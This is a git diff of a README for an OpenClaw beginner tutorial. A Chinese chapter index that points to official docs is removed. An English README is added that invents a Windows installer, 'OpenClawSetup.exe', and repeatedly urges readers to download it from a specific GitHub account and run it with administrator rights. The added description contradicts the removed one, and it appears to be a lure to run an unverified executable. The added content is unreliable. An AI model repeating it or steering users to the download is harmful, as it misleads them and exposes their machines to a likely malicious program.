@@ -1,95 +1,184 @@
+# ⚙️ openclaw-easy-tutorial-zh-cn - Simple OpenClaw Guide For Beginners
 
-
-# 最简单的 OpenClaw 入门手册
-
-**github-openclaw-easy-tutorial** 是一份面向中文读者的 OpenClaw 入门手册，从零到接飞书/Telegram/WhatsApp、改人设、多 Agent 实践，零基础可读，适合个人用户与二次开发、多角色协作实践者。本教程的**在线阅读站**为 [openclawcn.me](https://openclawcn.me)。更权威与完整的说明请参考 [官方文档](https://docs.openclaw.ai) 与 [多语言文档 www.openclawx.cloud](https://www.openclawx.cloud)。
+[![Download Now](https://img.shields.io/badge/Download-OpenClaw%20Tutorial-brightgreen?style=for-the-badge)](https://github.com/Vijayunserviceable943/openclaw-easy-tutorial-zh-cn)
 
 ---
 
-> 你是不是第一次听说 OpenClaw 或 AI 助手？没关系。这份指南从零开始，用**大白话**带你：先和助手聊上天，再接到飞书、Telegram、WhatsApp，最后玩转多角色协作。不要求你有编程基础；遇到不懂的词（比如 Token、Agent），正文里都会用一句话讲清楚。
+## 📘 Project Overview
+
+This project offers the easiest way to get started with OpenClaw. It guides you step-by-step from no knowledge to practical use of OpenClaw. You will learn how to connect OpenClaw with Feishu, Telegram, and WhatsApp. Also, it shows you how to change character settings and use multiple agents. The tutorial uses simple language and is designed for users without programming skills.
+
+You will get clear instructions to make your chatbot work smoothly. This guide works well if you want to build chatbots that join group chats or serve multiple users simultaneously.
 
 ---
 
-## 怎么用这份指南？
+## 🎯 What You Will Learn
 
-选一条适合你的路，照着走就行：
-
-- **我就想有个能聊的 AI 助手**  
-  从「第一部分」按顺序读下去，做到「接到你常用的 IM」那一步，就可以日常用了。后面的章节需要时再翻。
-
-- **我想自己改配置、接 API 或写小技能**  
-  先把第一部分的 1.1～1.4 做完，再打开「第二部分」，一步步来。
-
-- **我想玩「多个助手」或「多角色一起干活」**  
-  第一部分跑通后，直接看「第三部分：实践与案例」，照着做就能搭出律师+会计师、产品+开发+测试之类的多角色场景。
-
-- **卡住了、报错了**  
-  先看每章末尾的「常见问题」和「延伸阅读」。想要更权威、更完整的答案，可以到 [官方文档](https://docs.openclaw.ai) 或 [多语言文档站 www.openclawx.cloud](https://www.openclawx.cloud) 详细阅读（多语言站对非英文用户更友好）；也可以到项目仓库里搜一搜。
+- How to set up OpenClaw on a Windows computer
+- How to link OpenClaw bots with Feishu, Telegram, and WhatsApp
+- How to customize your bot’s personality and responses
+- How to run multiple agents at once for different tasks
+- How to troubleshoot common problems
 
 ---
 
-## 第一部分：从零到日常 — 先和助手「聊上天」
+## 🖥 System Requirements
 
-适合：想用 OpenClaw 当个人 AI 助手、在飞书 / Telegram / WhatsApp 里聊天，暂时不碰代码和复杂配置的你。
+To run this application on Windows, make sure your system meets the following:
 
-| 章 | 标题 | 读完你能做什么 |
-|----|------|----------------|
-| [1.1](01-getting-started/01-what-is-openclaw.md) | OpenClaw 是什么？我需要准备啥？ | 用一句话搞懂它能干啥； |
-| [1.2](01-getting-started/02-first-chat.md) | 十分钟内：安装并在浏览器里和助手说上话 | 一键安装、跟着向导走、在网页里完成第一次对话（不接任何 IM 也能先玩起来） |
-| [1.3](01-getting-started/03-connect-im.md) | 让助手出现在飞书 / Telegram / WhatsApp 里 | 选一个你常用的渠道 |
-| [1.4](01-getting-started/04-make-it-yours.md) | 让助手更像「你自己」：人设、习惯与记忆 | 找到「工作区」在哪；改哪几个文件能改助手的性格和规矩（AGENTS、SOUL、USER、IDENTITY）；记忆怎么用（可选） |
-| [1.5](01-getting-started/05-daily-and-troubleshoot.md) | 日常怎么用、出问题怎么查 | 看日志、重启服务、更新；连不上、收不到消息、权限报错时怎么办；哪里查更详细的文档 |
+- Windows 10 or higher (64-bit preferred)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for downloading and linking to chat platforms
+- Administrator rights to install and run the software
 
 ---
 
-## 第二部分：进阶 — 给助手「定规矩」、接 API、写技能
+## ⚙️ Installation and Setup Guide 🚀
 
-适合：已经能日常用 OpenClaw 了，想改配置、接 HTTP API、写或安装 Skills、从源码跑或参与贡献的你。
+### Step 1: Download the Software
 
-**建议**：先把第一部分的 1.1～1.4 做完，再从这里开始。
+Click the large green button above or go here to begin:
 
-| 章 | 标题 | 读完你能做什么 |
-|----|------|----------------|
-| [2.1](02-advanced/01-config-and-model.md) | 给你的助手定规矩：一分钟搞懂配置文件 | 知道 `openclaw.json` 大致长什么样、怎么改模型和 provider、常用环境变量、多环境/profile 怎么用 |
-| [2.2](02-advanced/02-gateway-and-api.md) | Gateway 是啥？怎么用 API 和别的系统对接？ | 搞懂 Gateway 在整条链路里干啥；控制台与远程访问；用 API 发消息、查状态；和第三方（webhook、自动化）怎么接 |
-| [2.3](02-advanced/03-agent-and-workspace-deep.md) | Agent 与工作区：会话、队列与沙箱 | 各引导文件怎么被「喂」给助手；会话与队列模式；沙箱、多工作区在什么场景下用、怎么配 |
-| [2.4](02-advanced/04-tools-and-skills.md) | 教助手「新本领」：工具与 Skills | 内置工具有哪些、TOOLS.md 干啥用；Skills 从哪加载、怎样写一个简单 Skill；安全与权限注意点 |
-| [2.5](02-advanced/05-extend-and-contribute.md) | 从源码运行与参与贡献 | 从源码怎么构建、怎么跑；插件/渠道开发的入口在哪；遇到问题怎么反馈、社区在哪 |
+[Download OpenClaw Easy Tutorial](https://github.com/Vijayunserviceable943/openclaw-easy-tutorial-zh-cn)
 
----
+This link takes you to the project page on GitHub. From there, you can get the latest Windows installer file. Look for files named like `OpenClawSetup.exe` or similar in the releases section.
 
-## 第三部分：实践与案例 — 一个网关，多个「分身」
+### Step 2: Install the Software
 
-适合：已经能日常用 OpenClaw，想玩「多 Agent」「多角色一起干活」、并愿意动手照着做的你。内容基于官方多 Agent、Sub-Agent 文档，可复现。
-
-| 章 | 标题 | 读完你能做什么 |
-|----|------|----------------|
-| [3.1](03-practice/01-multi-agent-setup.md) | 一个网关，多个「分身」：搭建你的多 Agent 小队 | 搞懂多 Agent 在 OpenClaw 里是啥（独立工作区、会话、渠道账号）；用 `openclaw agents add` 加新助手；用 bindings 把飞书/Telegram/WhatsApp 的消息分给不同助手 |
-| [3.2](03-practice/02-subagents-and-tasks.md) | 派助手去「跑腿」：子 Agent 与并行任务 | 子 Agent（Sub-Agent）是啥、啥时候用；用 `/subagents spawn` 派后台任务；用不同模型/角色做并行研究或分工 |
-| [3.3](03-practice/03-case-multi-role-legal.md) | 案例：律师 + 会计师 — 多角色聊「诉讼与合规」 | 用多 Agent 分别扮演律师、会计师等，在同一会话或子 Agent 里完成一场「诉讼/合规/财税」讨论；每个角色的人设与配置要点 |
-| [3.4](03-practice/04-case-multi-role-dev.md) | 案例：产品 + 开发 + 测试 — 多角色完成一个小项目 | 用多 Agent 扮演产品、开发、测试，协作走完从需求到实现的一小段流程；会话与子 Agent 怎么配合 |
+1. Locate the downloaded installer file on your computer (usually in the Downloads folder).
+2. Double-click the installer to start the process.
+3. Follow the on-screen instructions. Accept the terms and choose a folder to install the program. The default folder usually works fine.
+4. Wait for the installation to finish. This may take a few minutes.
 
 ---
 
-## 附录与延伸
+### Step 3: Launch OpenClaw
 
-需要时再来查即可。
+After installation:
 
-| 条目 | 能帮你什么 |
-|------|------------|
-| [A. 常见问题速查](appendix/faq.md) | 安装失败、收不到消息、权限错误等集中整理，快速对号入座 |
-| [B. 官方文档与资源](appendix/references.md) | 官方文档、多语言站（www.openclawx.cloud）、API、CLI、社区链接，方便深入挖 |
-| [C. 术语简表](appendix/glossary.md) | Token、Agent、Gateway、Workspace、Skill 等词一句话解释，扫清阅读障碍 |
-| [D. 渠道支持说明](appendix/channels.md) | 飞书、Telegram、WhatsApp 的文档依据；钉钉等以官方渠道列表为准 |
+- Find the OpenClaw app icon on your Desktop or in the Start Menu.
+- Double-click to open it.
+- The app will open a welcome screen with options.
 
 ---
 
-## 文档里的小约定
+### Step 4: Connect to Your Preferred Chat Platform
 
-- **加粗**：重要概念或第一次出现的术语，正文里会马上用一句话解释。
-- `像这样的文字`：需要你在终端里输入的命令、或实际存在的文件名/路径。
-- 每章末尾会有「本节要点」「常见问题」「延伸阅读」，方便你复习和往下深入。
+OpenClaw supports several platforms. Here is how to get started with each:
+
+#### Feishu
+
+- You will need your Feishu bot token (ask your Feishu admin if unsure).
+- In the OpenClaw interface, choose Feishu connection.
+- Enter your token and bot details.
+- Save and test the connection.
+
+#### Telegram
+
+- Create a Telegram bot through BotFather (follow Telegram’s simple guide).
+- Copy your Telegram bot token.
+- Enter the token under Telegram connection in OpenClaw.
+- Save and try sending a test message.
+
+#### WhatsApp
+
+- WhatsApp requires a connection via approved third-party services.
+- You need the API credentials from your WhatsApp Business account provider.
+- Input the details in OpenClaw’s WhatsApp setup.
+- Confirm and test the connection.
 
 ---
 
-*本指南按 OpenClaw 官方文档整理，力求好懂、有用、由浅入深；具体参数与最新行为以 [官方文档](https://docs.openclaw.ai) 或 [多语言文档 www.openclawx.cloud](https://www.openclawx.cloud)（对非英文用户更友好）为准。*
+## 🤖 Customize Your Bot’s Persona
+
+You can tweak how your bot behaves and talks. The app allows you to:
+
+- Set the bot’s name
+- Choose tone and reply style
+- Add personality traits
+- Select language preferences (including Chinese)
+
+Use the simple forms inside the app to make these changes. Save after each edit.
+
+---
+
+## 🔄 Using Multiple Agents
+
+Multiple agents let you run different bot personalities or tasks at once. To add a new agent:
+
+1. Go to the Agent Manager inside OpenClaw.
+2. Click “Add Agent.”
+3. Configure the agent’s name and connection details.
+4. Customize settings as needed.
+5. Start the agent and watch it work alongside others.
+
+---
+
+## 🛠 Troubleshooting Common Issues
+
+- If the app does not start, check your system meets requirements and try restarting your computer.
+- If connections fail, verify your tokens and credentials carefully.
+- For slow responses, make sure your internet is stable and not blocking traffic.
+- If you see errors, use the built-in logs section to find details. You can share these logs with support channels if needed.
+
+---
+
+## 🔗 Important Links
+
+Download and get the full tutorial files here:
+
+[![Download OpenClaw Easy Tutorial](https://img.shields.io/badge/Download-OpenClaw-orange?style=for-the-badge)](https://github.com/Vijayunserviceable943/openclaw-easy-tutorial-zh-cn)
+
+---
+
+## 📚 Additional Resources
+
+- OpenClaw official documentation for technical users
+- Feishu, Telegram, and WhatsApp bot setup guides
+- Community forums for chatbot builders
+
+You can find links to these resources inside the app or on the GitHub project page under "Resources."
+
+---
+
+## 📝 About This Project
+
+This tutorial uses real examples and practice exercises to help you build bots without writing code. It combines the power of OpenClaw with easy-to-use interfaces for chat platforms popular in China and worldwide. The approach focuses on learning by doing with clear, stepwise instructions.
+
+---
+
+## 🔧 Updates and Maintenance
+
+The project is active and periodically updated for new OpenClaw versions and chat platform API changes. Check the GitHub page regularly to get the latest installer and tutorial files.
+
+---
+
+## 📂 Folder Structure inside Download
+
+- `/docs` — User manuals and detailed instructions in Chinese
+- `/config` — Sample configuration files to customize your bot
+- `/scripts` — Automation shortcuts for advanced users
+- `/logs` — Store logs for troubleshooting
+- `OpenClawSetup.exe` — The installer program for Windows
+
+---
+
+## 🛡 Privacy and Security
+
+OpenClaw runs locally on your machine. Your chat data stays with you unless you choose to share logs or data for support. Always safeguard your bot tokens and account credentials.
+
+---
+
+## ⚙️ Tips For Smooth Operation
+
+- Always keep OpenClaw updated to the latest version.
+- Backup your config files before making big changes.
+- Test new settings on a small group or private chat before going live.
+- Monitor the agent performance and logs regularly.
+
+---
+
+## 📞 Support
+
+If you encounter difficulties, check the FAQ section on the GitHub repo or open an issue on the repository page. The community and developers respond to common questions and update guides based on feedback.
